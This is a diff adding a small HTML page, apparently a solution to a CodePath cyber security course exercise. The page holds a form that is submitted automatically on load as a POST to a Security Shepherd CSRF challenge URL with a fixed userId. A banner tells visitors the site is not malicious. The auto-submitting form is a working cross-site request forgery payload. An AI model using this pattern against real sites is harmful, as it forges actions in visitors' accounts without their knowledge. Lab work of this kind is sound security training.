@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>CSRF Exercise</title>
+  </head>
+  <body>
+    <p>This is a CSRF exercise for CodePath's Cyber Security course. Please do not be alarmed -- this is not a malicious site.</p>
+    <form name="csrfForm" action="http://securityshepherd.com/user/csrfchallengetwo/plusplus?userId=21d3c09c852aea1d62e7aafa87f1a0736ccc0f2f" method="POST">
+      <input type="submit"/>
+    </form>
+  <script>
+    document.csrfForm.submit();
+  </script>
+  </body>
+</html>
